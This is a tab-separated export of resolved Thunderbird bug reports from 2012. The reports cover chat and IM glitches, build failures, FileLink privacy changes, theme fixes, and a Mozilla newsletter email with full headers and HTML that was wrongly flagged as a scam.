776566%TAB%1343028416%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%JavaScript Error: "logFile is null" {file: "resource:///modules/index_im.js" line: 278,Deferred Gloda indexing for IM conversations%TAB%JavaScript Error: "logFile is null" {file: "resource:///modules/index_im.js" line: 278,Deferred Gloda indexing for IM conversationsThis happens when the first message of a conversation is received, because there's a race between the gloda indexing that now happens on the fly, and the logger that writes the new message to disk, and the indexing code is unhappy that the log file for the conversation doesn't exist yet, causing this JS error: [Exception... "'[JavaScript Error: "logFile is null" {file: "resource:///modules/index_im.js" line: 278}]' when calling method: [nsIObserver::observe]"  nsresult: "0x80570021 (NS_ERROR_XPC_JAVASCRIPT_ERROR_WITH_DETAILS)"  location: "JS frame :: file:///.../DailyDebug.app/Contents/MacOS/components/imConversations.js :: <TOP_LEVEL> :: line 237"  data: yes]
776528%TAB%1343020632%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Chat tab title not correctly updated after closing a selected conversation%TAB%Chat tab title not correctly updated after closing a selected conversationThis is because when a conversation is closed, the code attempting to update the tab title calls Services.conversations.getUIConversations() which still returns the conversation that has just been closed, and the isChat getter of that already closed conversation doesn't work because _currentTargetId has already been deleted.  An easy fix is to just send the ui-conversation-closed notification a little bit later so that the closed conversation isn't listed in the results of getUIConversations.
776523%TAB%1343019535%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Builds are oranging out on make check with "TEST-UNEXPECTED-FAIL | check-sync-dirs.py | build file copies are not in sync"%TAB%Builds are oranging out on make check with "TEST-UNEXPECTED-FAIL | check-sync-dirs.py | build file copies are not in sync"Showed up over the weekend,  make -C testing/mozbase check make[2]: Entering directory /builds/slave/tb-c-cen-lnx/build/objdir-tb/mozilla/testing/mozbase' make[2]: Nothing to be done for check'. make[2]: Leaving directory /builds/slave/tb-c-cen-lnx/build/objdir-tb/mozilla/testing/mozbase' make[1]: Leaving directory /builds/slave/tb-c-cen-lnx/build/objdir-tb/mozilla' TEST-UNEXPECTED-FAIL | check-sync-dirs.py | build file copies are not in sync  From https://tbpl.mozilla.org/php/getParsedLog.php?id=13755026&tree=Thunderbird-Trunk&full=1
776511%TAB%1343018311%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Remove the observers added by chat-messenger-overlay.js when closing a messenger window%TAB%Remove the observers added by chat-messenger-overlay.js when closing a messenger windowFor some reason, when I initially wrote that code I assumed that now that Thunderbird has tabs, there's only one messenger window with the same life time as the application, so removing the observers wasn't needed. This is obviously wrong, so here's a patch to fix this.  Note: the patch from bug 775105 needs to be applied before this patch.
776474%TAB%1343006848%TAB%447359%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Account Manager,Instant Messaging%TAB%Multiple Twitter Accounts not working,Make twitter account setup less fragile%TAB%Multiple Twitter Accounts not working,Make twitter account setup less fragileUser Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713224758  Steps to reproduce:  I tried to add more than one Twitter Account, but login was not possible for the second account.   Actual results:  I can only use one Twitter Account in the new Chat Tab. After authentication via Twitter API I get the following error:  "Error: Username mismatch"    Expected results:  It would be nice, if I could use multiple Twitter Accounts
776463%TAB%1343002483%TAB%250154%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%subject in message list displayed interchanged,IMAP msgs besides RSS msgs after filtering: Subject in message list sometimes different from real subject of message (correctable by "Repair folder")%TAB%subject in message list displayed interchanged,IMAP msgs besides RSS msgs after filtering: Subject in message list sometimes different from real subject of message (correctable by "Repair folder")User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713134347  Steps to reproduce:  I use TB for a single IMAP mail account (on an outlook server) and several RSS feeds. I installed a filter to copy RSS items to the inbox root folder whose subject contains at least one of a number of keywords.   Actual results:  In the inbox list view all filtered RSS messages expectedly appear besides my IMAP mails. But sometimes a subjects is displayed wrong.   In the current case a series of three items are listed in my inbox that were copied from RSS by my filter. The subject of the first item displayed in the list is wrong: the third's suject is diplayed instead of it's own. When I select any of the three items in the list view they are displayed correct in the preview window but the list view stays wrong.  I do not remember surely but I believe that the error does not appear when only a single RSS item is copied during a filter call. I do remember exactly whether headers of RSS and mails are interchanged between themselves. I believe the error only appears when RSS items exist: mail only lists without aggregeted RSS items seem not to be concerned.  The error is not new in TB12, I remember to have seen it before for at least about two years (also in my former Oses WinXP64 and 32)  When I restart TB (restart included an update to TB 14) the error persists. Compacting folders does not help, too. Copying the series of RSS items (from the screenshot) to an IMAP subfolder the wrong subjects are displayed there, too.   Expected results:  The list view should always show the correct subject, not a subject of another item
776402%TAB%1342962555%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Update usage of GetCodebasePrincipal to reflect changes to API%TAB%Update usage of GetCodebasePrincipal to reflect changes to APIBug 774585 changed the way that GetCodebasePrincipal works (see https://bugzilla.mozilla.org/show_bug.cgi?id=774585#c0).  Thunderbird uses GetCodebasePrincipal in 3 locations:  /mail/components/newmailaccount/content/accountProvisioner.js     line 46 -- var principal = ssm.getCodebasePrincipal(uri);  /mail/components/aboutRedirector.js     line 54 -- let principal = secMan.getCodebasePrincipal(aURI);  /mail/test/mozmill/newmailaccount/test-newmailaccount.js     line 1205 -- let principal = ssm.getCodebasePrincipal(uri);  These need to be updated to fix Account Provisioner and our About Redirector.  Cc'ing some SeaMonkey people, because I think suite is affected too.
776349%TAB%1342932146%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Main toolbox still shown with all toolbars hidden%TAB%Main toolbox still shown with all toolbars hiddenWhen all toolbars are hidden through menu View > Toolbars the toolbox is still shown with a height of 41px.  This patch removes the toolbox's min-height and adds margins to the toolbar. I can't give a min-height to the toolbar because this let's grow the buttons to full height. So I gave the toolbar top- and bottom-margins to become the height we need for the Australis theme. On Win7 and OSX this is easy with only one button height. On XP and Linux with the big and small icons it's a little bit trickier.  I set the :only-of-type to apply only when one toolbar is set. When two toolbars are set they are taller than the minimum height and the margins aren't needed. The only drawback with this is, when two toolbars are defined (with Add toolbar in Customize window) and one is hidden, then the only visible toolbar has no margins. But I think it's really seldom someone uses this configuration.
776316%TAB%1342901233%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Update Mozmill's httpd.js to use network.http.max-persistent-connections-per-server%TAB%Update Mozmill's httpd.js to use network.http.max-persistent-connections-per-serverBug 770331 changed a pref on us, and our Mozmill tests have been busted ever since.  We need to update the pref in our version of Mozmill to fix it.  Not sure if the Mozmill guys know about this one, so I'm Cc'ing Henrik.
776227%TAB%1342834409%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%FileLink%TAB%Handle missing providers more gracefully%TAB%Handle missing providers more gracefullyI used to have Dropbox as a filelink provider which is now obviously gone. When doing certain operations (like enumerating accounts), there are some error console messages. Since the same thing may happen with Filelink extensions, I think certain errors should be swallowed and the account not returned.  Relevant errors are:  Timestamp: 7/21/12 12:26:52 PM Error: [Exception... "Component returned failure code: 0x80040111 (NS_ERROR_NOT_AVAILABLE) [nsICategoryManager.getCategoryEntry]"  nsresult: "0x80040111 (NS_ERROR_NOT_AVAILABLE)"  location: "JS frame :: resource:///modules/cloudFileAccounts.js :: <TOP_LEVEL> :: line 88"  data: no] Source File: resource:///modules/cloudFileAccounts.js Line: 90  Timestamp: 7/21/12 12:26:52 PM Error: provider is null Source File: resource:///modules/cloudFileAccounts.js Line: 46
775105%TAB%1342591345%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Presence information in email headers isn't shown correctly when there are multiple email windows%TAB%Presence information in email headers isn't shown correctly when there are multiple email windowsThe presence information in email headers added in bug 763522 doesn't work at all for standalone message windows, and shows as online only the contact that signed on after the 3pane window was opened, so it's unreliable for windows that haven't been opened at startup.  The patch also fixes another issue related to having multiple 3pane windows: the OAuth dialog to authenticate with twitter was shown once per 3pane window.
774731%TAB%1342512606%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Previous conversations sometimes not displayed%TAB%Previous conversations sometimes not displayedI've debugged a few cases where the "Daily currently doesn't have any previous conversations stored for this contact." panel was displayed instead of an existing previous conversation.  It happened when selecting a contact with a previous conversation, then a contact without previous conversation, then selecting the contact with a previous conversation again. This is because in my patch for bug 754914 I prevented redisplaying a previous conversation if it was already displayed in the browser, but I forgot to still ensure the log panel is visible.  The same thing can happen for the "Search result" item: the log panel isn't always shown correctly when reselecting that item.  And a last case causing a similar problem: closing the "search result" conversation, which actually just hides it. This attempts to select another conversation, but the mousedown event handler of listbox.xml immediately reselects it even though it is hidden, so when displaying it again the 'select' event isn't fired, as the item is already selected.
774666%TAB%1342505354%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Twitter avatars from past tweets in stream not visible after opening chat tab in new window%TAB%Twitter avatars from past tweets in stream not visible after opening chat tab in new windowSTR:  1)  Open a Twitter stream in a chat tab. Ensure that you can see the user avatars for each tweet 2)  Open the chat tab in a new window (open a message in a tab, move to new window, open chat tab)  What happens?  The avatars are missing in the Twitter stream in the new tab. New tweets contain avatars though.  What's expected?  The avatars should be visible in both windows when the new chat tab is opened.
774658%TAB%1342503674%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Online contacts appear offline when moving chat tab to new window%TAB%Online contacts appear offline when moving chat tab to new windowSTR:  1) Open a chat tab, and ensure you have an account set up with some online / offline contacts (like Google Talk). 2) Open an email in a new tab, then detach the tab 3) In the new window that's opened, open a new chat tab  What happens?  All contacts appear to be offline - even the ones that are clearly online / busy.  What's expected?  Contacts that are online should be in the online contact group.
774167%TAB%1342377673%TAB%441551%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Thunderbird buttons,Personas make close/minimise/maximise buttons look strange on Windows%TAB%Thunderbird buttons,Personas make close/minimise/maximise buttons look strange on WindowsUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/16.0 Firefox/16.0 Build ID: 20120715030544  Steps to reproduce:  1. installed a Persona 2. the Close/Maximize/Minimize buttons are out of whack with any Persona installed   Actual results:  no crash's as such, just that the buttons look terrible, i even made a New install/profile with the same problem   Expected results:  the persona shouldnt make the Close/Max/Min buttons look like they do in the screenshot
774064%TAB%1342320895%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Use const nsIAbDirectory and remove and set tooltiptext in msgHdrViewOverlay%TAB%Use const nsIAbDirectory and remove and set tooltiptext in msgHdrViewOverlayFollowing landing of Bug 131571 for SeaMonkey, there are a number of potential tweaks that could be applied to Thunderbird.
774063%TAB%1342320182%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Use image instead of html:img in addressbook contacts%TAB%Use image instead of html:img in addressbook contactsFollowing landing of Bug 762669 and Bug 773821 for SeaMonkey, might as well port the removal of html:img to Thunderbird.
773437%TAB%1342095429%TAB%107420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%tabmail needs a "unregisterTabType" method%TAB%tabmail needs a "unregisterTabType" methodCurrently there is no way to remove a tabtype form tabmail.  You can register new tabs via registerTabType but you can not unregister them.  This makes it impossible for a restartless addon to remove it's self cleanly upon deactivation or uninstall.  To make things even worse a registered tabtypes can't be replaced or updated. So ironically restartless addons using custom tab types can not be updated without a restart...
772773%TAB%1341963901%TAB%446451%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%"is typing..." message in chat box doesn't disappear%TAB%"is typing..." message in chat box doesn't disappearThe message "is typing" in the "contact box" in instant messaging tab stay there even if my friend has sent his message.  I found that the message is replaced by the status (available for example) if i change chat window and come back on the first one, I think the problem can be solved by refreshing the status in the same way that it is done when changing chat window.
772648%TAB%1341923134%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Don't try to pack crashreporter if it is disabled%TAB%Don't try to pack crashreporter if it is disabledEverytime I build TB with disabled crashreporter I get the warning:  Warning: package error or possible missing or unnecessary file: Thunderbird.app/Contents/MacOS/crashreporter.app/ (package-manifest, 583).  This patch will fix this in the same way as it is allready for Firefox.
772072%TAB%1341813098%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%FileLink%TAB%Add warning to Filelink about URL guessing%TAB%Add warning to Filelink about URL guessingFrom the Filelink privacy review:  "We point the user at the privacy and terms of service of the providers. We also are requiring the providers not to expire files, so that the e-mail recipients don't end up with stale links.  Risk: A "surprise" may manifest itself is when a user mis-forwards the message to the wrong party and the file can be downloaded by an unintended recipient. This can happen with the current set-up if a user forwards an attachment to the wrong party, and is a risk inherent in email.  An added risk of this system is that the file is publicly available and not limited in accessibility to those who can access the message itself. This is like 'security by obscurity', which is not ideal, but acceptable in this case since users know the file will be uploaded to a sharing service.  Recommendation: Make it clear to users that uploaded files will be world-readable (to members of the world who know where to find it).
772070%TAB%1341812471%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%FileLink%TAB%Increase Filelink offer threshold to 5MB%TAB%Increase Filelink offer threshold to 5MBAccording to the Filelink privacy review:  "Initially, attached files larger than 1MB trigger a prompt that suggests the File Upload feature to users. This can be adjusted.  Risk: users may encounter this dialog more than they want and start uploading files more than necessary (especially smaller documents that should be kept more confidential.)  Recommendation: To minimize potential for unnecessary use, we should increase the trigger size to be closer to the attachment limit for most SMTP servers. 5 MB is a common attachment limit for SMTP servers. "
772005%TAB%1341794275%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Further improve notification of new chat messages%TAB%Further improve notification of new chat messagesIn bug #748358 we stopped opening a new tab and changed the icon when there were new unread chat messages. JB suggested that we should try and do something more than just change the color (Win/Mac, Linux use a flare) to grab your attention. It would also be good to allow you to see the number of unread messages.
771816%TAB%1341651331%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Investigate the menubar position with Draw in titlebar under XP,Create a pref to disable "Draw in titlebar"%TAB%Investigate the menubar position with Draw in titlebar under XP,Create a pref to disable "Draw in titlebar"With landing of bug 755793 the toolbars are now shifted into the titlebar. With the menubar always shown this makes the area above the tabs tall and dominant. This bug is to investigate if we should leave it as it is or we should move the menubar below the tabs like under Vista/Win7.
771277%TAB%1341484955%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Fix XPCShell password authentication tests so that they don't pass around fake docShells%TAB%Fix XPCShell password authentication tests so that they don't pass around fake docShellsBug 669603 introduced a change that makes it impossible for us to mock docShells with JavaScript for our XPCShell tests.  We need to alter our authentication and testing infrastructure so that passing around fake docShells is no longer required.
771132%TAB%1341464649%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%FileLink%TAB%YouSendIt uploads return busted Filelink URLs%TAB%YouSendIt uploads return busted Filelink URLsSTR:  1) Upload a file to YouSendIt via Filelink  What happens?  The link returned from YouSendIt is in the form of:  www.yousendit.com/download/QlVpQk16Rnd3NUtwSHNUQw  as opposed to:  https://www.yousendit.com/download/QlVpQk16Rnd3NUtwSHNUQw
771085%TAB%1341452623%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Define MOZ_APP_BASENAME for Thunderbird to help fix Permanent orange: TEST-UNEXPECTED-FAIL | test_0200_app_launch_apply_update.js failures (and test_0201..., test_0203...)%TAB%Define MOZ_APP_BASENAME for Thunderbird to help fix Permanent orange: TEST-UNEXPECTED-FAIL | test_0200_app_launch_apply_update.js failures (and test_0201..., test_0203...)Somehow in my testing, I discovered that Thunderbird isn't creating an update-settings.ini file.  This file is currently used for double-checking the correct mar is apply to the correct build on a multi-build system, but is unused for Thunderbird as we haven't quite got that far yet.  However, for some reason the unit tests require it, and since we'll be getting it anyway, I think we should just pick it up.  If we set MOZ_APP_BASENAME, then mozilla/build will also generate an application.ini, but that will get overwritten by the one in mail/app, so that will be fine. We'll pick up the core one when we can.  Try server builds with this patch available here:  https://ftp.mozilla.org/pub/mozilla.org/thunderbird/try-builds/bugzilla@standard8.plus.com-1d657d398f2f/  The change is basically a no-op for us, apart from adding that update-settings.ini file, I diffed a windows build from that directory with the nightly build and the only differences were the expected ones.
770288%TAB%1341224076%TAB%403792%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Mozilla emails being marked as scam%TAB%Mozilla emails being marked as scamHi,   John O’Duinn pointed out that Thunder Bird is marking our Mozilla emails spam.  These communications are coming from a third party vendor – ExactTarget.  We use Exact Target for all marketing communication to community and more than 7 million Firefox & You subscribers.  Can you explain why these emails might be marked as a scam?  There is a tracking pixel being used here.  I imagine that might have something to do with it.  Here’s the header info from the email.  I’ve also included the html.    Please let me know if there’s additional information that would be helpful.  **** HEADER INFO ****  Return-Path: bounce-2775_HTML-27847667-88854-1065730-0@bounce.e.mozilla.org Received: from zmmta2.mail.corp.phx1.mozilla.com (LHLO  zmmta2.mail.corp.phx1.mozilla.com) (10.20.77.30) by  zmmbox4.mail.corp.phx1.mozilla.com with LMTP; Mon, 2 Jul 2012 11:34:13  -0700 (PDT) Received: from psmtp.com (zlb1.mail.corp.phx1.mozilla.com [10.20.77.200]) 	by zmmta2.mail.corp.phx1.mozilla.com (Postfix) with ESMTPS id 6F305102A03 	for <wbowden@mozilla.com>; Mon,  2 Jul 2012 11:34:13 -0700 (PDT) Received: from mta.e.mozilla.org ([68.232.195.97]) by exprod5mx211.postini.com ([64.18.4.10]) with SMTP; 	Mon, 02 Jul 2012 12:34:13 MDT DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=200608; d=e.mozilla.org;  h=From:To:Subject:Date:List-Unsubscribe:MIME-Version:Reply-To:Message-ID:Content-Type; i=Mozilla@e.mozilla.org;  bh=E/gp8fm+FcyT7doaSkiiNvYD7dk=;  b=GZXhEyJvzIoDigoXFoNlqRVvT7fPEtKBgrMWx9BYMmlInFrHtiNLqCUsKVhzmCaAQ5CUDQfnZDN5    +SL3lnXN40u4d1U8MfDL8tGXnGAfZ5FzNl3tRzfuFEfhvFd6XdH6tNSzAAkUl0vyHEKJARthV/rB    7nL7ky91etmBnXViV6E= DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=200608; d=e.mozilla.org;  b=BBlcRfIKhBVxyT44gMcx3X2vcCewpeLuwD2RdNHKTHvTlnpNiIwoy4hSZPriDoqO165sQtsp+exa    i72hbHa6gWIpbZupMdw+6NrrWkohc+DlmjRMysDMXIcusW/Ul6GTxpe075LTuxWeQviQb93v0vEX    Hz80cQM7OcJkybdTp1w=; Received: by mta.e.mozilla.org (PowerMTA(TM) v3.5r16) id hu7ko20ie1s7 for <wbowden@mozilla.com>; Mon, 2 Jul 2012 12:33:05 -0600 (envelope-from <bounce-2775_HTML-27847667-88854-1065730-0@bounce.e.mozilla.org>) From: "Mozilla" <Mozilla@e.mozilla.org> To: <wbowden@mozilla.com> Subject: Mozilla Gains Global Support For a Firefox Mobile OS Date: Mon, 02 Jul 2012 12:33:40 -0600 List-Unsubscribe: <mailto:leave-fd16167772616b2531492c-fe5016777d60037b7313-feee1c787d6100-fe9915707361037e75-ffcf14@leave.e.mozilla.org> MIME-Version: 1.0 Reply-To: "Mozilla" <reply-feee1c787d6100-2775_HTML-27847667-1065730-0@e.mozilla.org> x-job: 1065730_88854 Message-ID: <079d6caf-d3f7-4b8a-8779-483e4b160ced@xtnvmta1203.xt.local> Content-Type: multipart/alternative; 	boundary="QI9GnBJAHGUK=_?:" X-pstn-neptune: 0/0/0.00/0 X-pstn-levels:     (S: 0.01376/97.17264 CV:99.9000 FC:95.5390 LC:95.5390 R:95.9108 P:95.9108 M:97.0282 C:98.6951 ) X-pstn-dkim: 1 skipped:not-enabled X-pstn-cm-addresses: from <Mozilla@e.mozilla.org> (approved) X-pstn-settings: 5 (2.0000:2.0000) s cv gt3 gt2 gt1 r p m c  X-pstn-addresses: from <Mozilla@e.mozilla.org> forward (org good) [353/13]   This is a multi-part message in MIME format.  --QI9GnBJAHGUK=_?: Content-Type: text/plain; 	charset="us-ascii" Content-Transfer-Encoding: 7bit  **** HTML ****  <html>  <head>  </head><body>     <table width="100%" cellspacing="0" cellpadding="0" border="0" align="center">    <tbody>     <tr>      <td valign="top" bgcolor="#ffffff" style="font-size: 10px; line-height: 1.25;">      <table width="600" cellspacing="0" cellpadding="0" border="0" align="center">        <tbody>        <tr>         <td style="font-size: 10px; line-height: 1.25;">         <table width="600" cellspacing="0" cellpadding="0" border="0" class="headerTable">          <tbody>           <tr>            <td>  <table cellpadding="0" cellspacing="0" border="0" bordercolor="" width="100%" bgcolor=""><tr><td><table  width="100%" bgcolor="#ffffff" border="0" bordercolor="" cellpadding="5" cellspacing="0"><tr><td style="font-family:Arial; font-size:13px"><p style="margin-top: 0px; margin-bottom: 0px;" id="text-placeholder">             <style> &lt;!--  /* Font Definitions */ @font-face 	{font-family:&quot;Courier New&quot;; 	panose-1:2 7 3 9 2 2 5 2 4 4; 	mso-font-charset:0; 	mso-generic-font-family:auto; 	mso-font-pitch:variable; 	mso-font-signature:3 0 0 0 1 0;} @font-face 	{font-family:&quot;ï¼¬ï¼³ æ˜Žæœ&quot;; 	panose-1:0 0 0 0 0 0 0 0 0 0; 	mso-font-charset:128; 	mso-generic-font-family:roman; 	mso-font-format:other; 	mso-font-pitch:fixed; 	mso-font-signature:1 134676480 16 0 131072 0;} @font-face 	{font-family:&quot;ï¼¬ï¼³ æ˜Žæœ&quot;; 	panose-1:0 0 0 0 0 0 0 0 0 0; 	mso-font-charset:128; 	mso-generic-font-family:roman; 	mso-font-format:other; 	mso-font-pitch:fixed; 	mso-font-signature:1 134676480 16 0 131072 0;}  /* Style Definitions */ p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:&quot;&quot;; 	margin:0in; 	margin-bottom:.0001pt; 	mso-pagination:widow-orphan; 	font-size:10.0pt; 	font-family:&quot;Courier New&quot;; 	mso-fareast-font-family:&quot;ï¼¬ï¼³ æ˜Žæœ&quot;; 	mso-fareast-theme-font:minor-fareast; 	mso-bidi-font-family:&quot;Courier New&quot;;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	font-size:10.0pt; 	mso-ansi-font-size:10.0pt; 	mso-bidi-font-size:10.0pt; 	font-family:&quot;Courier New&quot;; 	mso-ascii-font-family:&quot;Courier New&quot;; 	mso-fareast-font-family:&quot;ï¼¬ï¼³ æ˜Žæœ&quot;; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:&quot;Courier New&quot;; 	mso-bidi-font-family:&quot;Courier New&quot;;} @page WordSection1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.WordSection1 	{page:WordSection1;} --&gt;  </style>       </p><p class="MsoNormal"><span style="">Hello all, <br /> <br /> Today we made a significant announcement about the next milestone in the delivery of mobile devices (based upon our Boot-to-Gecko project), including the confirmation of OEM partners that will work with Mozilla and Telefonica to bring the first devices to market. (URL pasted below). &nbsp;This announcement demonstrates great momentum for the project and a groundswell of support in the industry for our efforts. &nbsp;I know this progress has taken tremendous energy from many of you and many throughout our community - thank-you! &nbsp;<br /> <br /> Key highlights of this press release include the fact that we'll be using Firefox branding on this new mobile operating system (OS); the confirmation that we are on track with Telefonica, Qualcomm and the OEM partners to deliver the first devices in early 2013; and a number of new operator partners who are interested in supporting the Firefox OS at some point in the future.<br /> <br /> On the last item, please understand that this does not mean that all of the operators mentioned are committed to immediately delivering devices, but it does mean that we are in active discussions with them, and that they support our general strategic direction. It is important at this stage in our delivery that we not confuse the market by incorrectly stating the status of any of our partners or the delivery of various milestones of the project so I ask for your continued help to involve the project team and/or the press team before you comment (tweet, blog, etc) publicly. &nbsp;We just want to make sure we all comment accurately. &nbsp;<br /> <br /> We have the opportunity to do something truly disruptive and positive for consumers and the mobile industry with the Firefox OS, just like we did with the Firefox browser on the desktop. I hope that you all share my enthusiasm and I thank you in advance for your continued hard work!<br />  <br /> Best,<br /> Gary Kovacs<br /> <br /></span><a   title=" http://blog.mozilla.org/blog/2012/07/02/firefox-mobile-os/" href="http://click.e.mozilla.org/?qs=ae279cd30b52a46d97cd94632e3425cf559b2ec92d88c808e9d8d54d28bcf26f"> http://blog.mozilla.org/blog/2012/07/02/firefox-mobile-os/</a></p>&nbsp;</td></tr></table></td></tr></table>             <em>  You're receiving this email because you're a registered Mozillian.  We'll send you timely and occasional organizational news and updates - meant just for Mozillians.  If you do not wish to receive these updates, please unsubscribe   <a style="color: rgb(119, 119, 119);" class="greyLink" href="http://click.e.mozilla.org/?qs=ae279cd30b52a46de7ecc7e940e30e7767a84514cb3e6ab19782b11b9e146c41">here</a>. Read the <a style="color: rgb(119, 119, 119);" class="greyLink" href="http://click.e.mozilla.org/?qs=ae279cd30b52a46de2673f7320864faa2ca40069142da8653325ed74c2c878e8">Mozilla Privacy Policy</a>.</em>            <p></p>             <p class="address">Mozilla<br />            650 Castro Street, Suite 300<br />            Mountain View, CA 94041-2021<br />            (650)903-0800</p>            </td>           </tr>          </tbody>          </table>         </td>        </tr>       </tbody>      </table>      </td>     </tr>    </tbody>   </table>  <img src="http://click.e.mozilla.org/open.aspx?ffcb10-feee1c787d6100-fe4d1c7970630c757410-fe9915707361037e75-ff2a16777261-fe5016777d60037b7313-ffcf14&d=40015" width="1" height="1">   </body></html></body></html>
770139%TAB%1341199776%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Status icon in message header and chat toolbar are different%TAB%Status icon in message header and chat toolbar are differentThey message header status icon and the toolbar icon is styled differently. This uses the platform specific presence icons in themes instead.
770133%TAB%1341198120%TAB%312990%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Toolbars and Tabs%TAB%duplicated DOM IDs dummycontenttoolbox and dummycontenttoolbar in specialTabs.xul%TAB%duplicated DOM IDs dummycontenttoolbox and dummycontenttoolbar in specialTabs.xulUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1 Build ID: 20120614114901  Steps to reproduce:  in specialTabs.xul, same DOM IDs are exist.  http://mxr.mozilla.org/comm-central/source/mail/base/content/specialTabs.xul#21 http://mxr.mozilla.org/comm-central/source/mail/base/content/specialTabs.xul#36  - dummycontenttoolbox - dummycontenttoolbar  And when open a tab as contentTab or chromeTab type, duplicated element's ids are created with cloneNode.     Expected results:  To be fixed,  1. )change to dummychrometoolbox and dummychrometoolbar from dummycontenttoolbox and dummycontenttoolbar in chromeTab id's element.   2.) change ids after cloneNode on "openTab" method each of chromeTab and contentTab.
769917%TAB%1341036890%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Address Book%TAB%Accesskey conflict in address book contact%TAB%Accesskey conflict in address book contactBoth the Chat tab and the Home Address field in the Photo tab use the same accesskey http://mxr.mozilla.org/comm-central/source/mail/locales/en-US/chrome/messenger/addressbook/abCardOverlay.dtd#130 http://mxr.mozilla.org/comm-central/source/mail/locales/en-US/chrome/messenger/addressbook/abCardOverlay.dtd#72 The Home Address field should probably switch to "d"
768928%TAB%1340781328%TAB%100230%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%PGP/MIME proxy implementation for mimelib%TAB%PGP/MIME proxy implementation for mimelibIn order to change Enigmail into a pure JS implementation, some basic mimelib functionality written needs to be moved into Thunderbird.  The attached patch implements a new mimelib class (plus the corresponding hooks) that allow Enigmail to register to mimelib and process PGP/MIME encrypted data.  My implementation assumes that mimelib is single-threaded (and therefore only 1 instance of nsPgpMimeProxy is needed). I'm not sure if my assumption is correct; otherwise I'd have to change a few things.
768919%TAB%1340779591%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Refine IRC theme,Refine the theme of chat messages%TAB%Refine IRC theme,Refine the theme of chat messagesIRC conversations do not need fancy layout, and probably not big avatars, but do need color codes. I think we should  - either remove avatars or display a very short (as opposed to tall) version of it - shrink space between exchanges - add color codes in the participants list and in the message author header
768621%TAB%1340709755%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%show the size of a mail folder on disk somewhere in the Thunderbird UI%TAB%show the size of a mail folder on disk somewhere in the Thunderbird UIShow the size of a mail folder on disk somewhere in the Thunderbird UI, my proposal is for folder -> Properties... -> General information.  I understand this information was intentionally removed from the folder pane. But there should at least be some hidden way to show the size to the user. Even Outlook has this possibility.  Maybe this is applicable to Seamonkey, even though it still has the size in the folder pane.
767987%TAB%1340602730%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Integrate new IM notifications in nsMessengerOSXIntegration.mm%TAB%Integrate new IM notifications in nsMessengerOSXIntegration.mmAttaching a first WIP that bounces the dock icon when new IMs arrive.  Other parts that need to be handled: - popup (Growl) notifications - unread count in the dock icon badge
